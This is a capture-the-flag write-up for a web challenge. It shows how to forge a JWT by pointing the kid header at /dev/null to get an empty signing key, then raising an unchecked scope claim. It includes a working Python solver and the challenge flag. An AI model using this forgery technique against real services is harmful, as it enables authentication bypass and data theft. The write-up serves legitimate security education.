# Lantern Ledger (500) — Web

> The Lantern Council moved its public archive to a capability-based ledger...
> A leaked memo says the sealed council index was exposed briefly during key
> rotation. http://20.244.105.226:8084

**Target:** `http://20.244.105.226:8084`
**Flag:** `AIT{l4nt3rn_k1d_tr4v3rs4l_nu11_k3y_b3f8}`

## Vulnerability
Two bugs combined:
1. **`kid` path traversal → null key.** The JWT verifier loads the HMAC key from
   the file named by the token's `kid` with no sanitization. Pointing `kid` at
   `../../../../dev/null` makes the key an **empty string**, which you can sign
   yourself — a full signature bypass.
2. **Scope is a trusted claim**, not a server-enforced grant, so you elevate by
   editing it.

## Steps
1. `/api/passes/visitor` issues an HS256 JWT (`typ: LCP`), header
   `kid: "visitor-2026.key"`, payload `{"sub":"public-visitor","scope":"gallery:read"}`.
   Site notice: *"Rotating key files are selected by a capability's declared key
   identifier; legacy readers resolve identifiers from the key store."*
2. `/api/preview` is just an SSRF relay (not token-gated). Content discovery finds
   **`/api/council/ledger`**, which verifies the Bearer token via the `kid` key
   and checks scope.
3. Set `kid = ../../../../dev/null` and sign with an **empty key**. Proof it's a
   real bypass: a tampered sig returns `invalid council capability`, the empty-key
   sig returns `scope insufficient` (verified, only scope wrong).
4. Brute the scope claim → `scope: "council:index:read"` unlocks the sealed index.

## Solver
```python
import base64,json,hmac,hashlib,urllib.request
b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=').decode()
hd={"typ":"LCP","alg":"HS256","kid":"../../../../dev/null"}
pl={"sub":"public-visitor","scope":"council:index:read"}
h=b(json.dumps(hd,separators=(',',':')).encode())
p=b(json.dumps(pl,separators=(',',':')).encode())
sig=b(hmac.new(b'',f"{h}.{p}".encode(),hashlib.sha256).digest())
t=f"{h}.{p}.{sig}"
r=urllib.request.Request("http://20.244.105.226:8084/api/council/ledger",
                         headers={"Authorization":f"Bearer {t}"})
print(urllib.request.urlopen(r).read().decode())
# -> {"index":"sealed lantern index","verification_phrase":"AIT{l4nt3rn_k1d_tr4v3rs4l_nu11_k3y_b3f8}"}
```
